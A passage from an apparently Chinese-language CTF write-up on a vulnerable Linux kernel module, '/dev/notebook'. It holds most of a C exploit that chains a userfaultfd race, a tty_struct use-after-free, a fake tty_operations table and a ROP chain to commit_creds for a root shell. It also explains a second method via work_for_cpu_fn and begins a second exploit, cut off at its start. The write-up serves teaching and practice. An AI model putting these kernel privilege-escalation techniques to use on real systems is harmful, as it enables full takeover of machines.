(msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">char</span> * buf;</span><br><span class="line">&#125;Userarg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> note_fd;</span><br><span class="line"><span class="keyword">char</span> *userfaultfd_buf;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> note_fd,<span class="keyword">size_t</span> idx,<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    Userarg userarg=&#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .buf=buf,</span><br><span class="line">        .size=size</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(note_fd,<span class="number">0x100</span>,&amp;userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">int</span> note_fd,<span class="keyword">size_t</span> idx,<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    Userarg userarg=&#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .buf=buf,</span><br><span class="line">        .size=size</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(note_fd,<span class="number">0x300</span>,&amp;userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gift</span><span class="params">(<span class="keyword">int</span> note_fd,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    Userarg useraeg=&#123;</span><br><span class="line">        .buf=buf</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(note_fd,<span class="number">0x64</span>,&amp;useraeg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_userfaultfd</span><span class="params">(<span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">    edit(note_fd,idx,<span class="number">0x2000</span>,userfaultfd_buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_userfaultfd</span><span class="params">(<span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">    add(note_fd,idx,<span class="number">0x50</span>,userfaultfd_buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">serial_icounter_struct</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">&#125;Notebook;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    <span class="keyword">size_t</span> tty_struct[<span class="number">0x200</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> tty_fd[<span class="number">0x100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    note_fd=open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">0x200</span>];</span><br><span class="line">    Notebook notebook[<span class="number">0x10</span>];</span><br><span class="line">    page_size=sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    userfaultfd_buf=mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    page=<span class="built_in">malloc</span>(page_size);</span><br><span class="line">    <span class="built_in">memset</span>(page,<span class="number">1</span>,page_size);</span><br><span class="line">    registerUserFaultFd(userfaultfd_buf,page_size,fault_handler_thread);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        edit(note_fd,i,<span class="number">0x2e0</span>,name);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        pthread_create(&amp;tid,<span class="literal">NULL</span>,edit_userfaultfd,i);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        tty_fd[i]=open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR | O_NOCTTY);</span><br><span class="line">        <span class="keyword">if</span>(!tty_fd[i])&#123;</span><br><span class="line">            errExit(<span class="string">&quot;ptmx open fail&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        pthread_create(&amp;tid,<span class="literal">NULL</span>,add_userfaultfd,i);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fake_tty_ops_idx=<span class="number">-1</span>,rop_idx=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        read(note_fd,tty_struct,i);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> magic=*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)tty_struct;</span><br><span class="line">        <span class="keyword">if</span>(magic!=<span class="number">0x5401</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(fake_tty_ops_idx==<span class="number">-1</span>)&#123;</span><br><span class="line">                fake_tty_ops_idx=i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*] fake_tty_ops_idx %d\n&quot;</span>,fake_tty_ops_idx=i);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*] rop_idx %d\n&quot;</span>,rop_idx=i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(fake_tty_ops_idx==<span class="number">-1</span>||rop_idx==<span class="number">-1</span>)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;fake_tty_ops_idx or rop_idx find fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> uaf_tty=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        read(note_fd,tty_struct,i);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> magic=*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)tty_struct;</span><br><span class="line">        <span class="keyword">if</span>(magic==<span class="number">0x5401</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] uaf_idx %d\n&quot;</span>,uaf_tty=i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(uaf_tty==<span class="number">-1</span>)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;not uaf_tty&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> tty_ops=tty_struct[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span>((tty_ops&amp;<span class="number">0xfff</span>)==<span class="number">0x440</span>)&#123;</span><br><span class="line">        kernel_base=tty_ops-ptm_unix98_ops_offset;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        kernel_base=tty_ops-pty_unix98_ops_offset;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel_addr %p\033[0m\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    edit(note_fd,fake_tty_ops_idx,<span class="number">0x200</span>,name);</span><br><span class="line">    edit(note_fd,rop_idx,<span class="number">0x200</span>,name);</span><br><span class="line">    gift(note_fd,notebook);</span><br><span class="line">    <span class="keyword">size_t</span> init_cred_addr=init_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> commit_creds_addr=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> swapgs_restore_regs_and_return_to_usermode_addr=swapgs_restore_regs_and_return_to_usermode-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdi_ret_addr=pop_rdi_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdx_pop_rbp_ret_addr=pop_rdx_pop_rbp_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_ops[<span class="number">64</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_ops_addr=notebook[fake_tty_ops_idx].buf;</span><br><span class="line">    <span class="keyword">size_t</span> rop_addr=notebook[rop_idx].buf;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(fake_tty_struct,tty_struct,<span class="number">0x50</span>);</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">64</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>]=fake_tty_ops_addr;</span><br><span class="line">    fake_tty_struct[<span class="number">1</span>]=pop_rsp_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    fake_tty_struct[<span class="number">2</span>]=rop_addr;</span><br><span class="line"></span><br><span class="line">    ((struct tty_operations *)fake_tty_ops)-&gt;write=push_rdi_pop_rsp_pop_rbp_or_eax_edx_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=pop_rdi_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=prepare_kernel_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    rop[i++]=MOV_RDI_RAX_POP_RBP_RET-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    rop[i++]=swapgs_restore_regs_and_return_to_usermode_addr+<span class="number">22</span>;</span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=(<span class="keyword">size_t</span>)&amp;usr_shell;</span><br><span class="line">    rop[i++]=user_cs;</span><br><span class="line">    rop[i++]=user_rflags;</span><br><span class="line">    rop[i++]=user_sp;</span><br><span class="line">    rop[i++]=user_ss;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    write(note_fd,fake_tty_ops,fake_tty_ops_idx);</span><br><span class="line">    write(note_fd,rop,rop_idx);</span><br><span class="line">    write(note_fd,fake_tty_struct,uaf_tty);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;getshell :%p\n&quot;</span>,usr_shell);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        write(tty_fd[i],name,<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解法二：userfaultfd-uaf-tty-struct-work-for-cpu-fn"><a href="#解法二：userfaultfd-uaf-tty-struct-work-for-cpu-fn" class="headerlink" title="解法二：userfaultfd+uaf+tty_struct+work_for_cpu_fn"></a><strong>解法二</strong>：userfaultfd+uaf+tty_struct+work_for_cpu_fn</h4><p>在开启了多核支持的内核中都会有这个<code>work_for_cpu_fn</code>,它就相当于一个gadget,执行rdi+0x20,参数是rdi+0x28,把返回值保存在rdi+0x30的地方,假如我控制<code>tty_struct</code>的<code>tty_operations</code>的的<code>ioctl</code>函数指针为<code>work_for_cpu_fn</code>，在调用<code>ioctl(tty_fd,0x200,0x200)</code>就会调用<code>tty_operations</code>的<code>ioctl</code>也就是<code>work_for_cpu_fn</code>函数，此时rdi就是tty_struct,而此时tty_struct能劫持的话就能任意函数执行了，我们可以执行<code>prepare_kernel_cred(0)</code>然后把返回值存储在<code>tty_struct+0x30</code>的地方，执行完<code>work_for_cpu_fn</code>之后内核自动返回用户态，就不用我们自己构造了，然后再执行一次<code>commit_creds(tty_struct+0x30)</code>就可以得到root权限了，最后返回用户态执行<code>system(&quot;/bin/sh&quot;)</code>;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="keyword">long</span> (*fn)(<span class="keyword">void</span> *);</span><br><span class="line">    <span class="keyword">void</span> *arg;</span><br><span class="line">    <span class="keyword">long</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">work_for_cpu_fn</span><span class="params">(struct work_struct *work)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> *<span class="title">wfc</span> =</span> container_of(work, struct work_for_cpu, work);</span><br><span class="line"></span><br><span class="line">    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 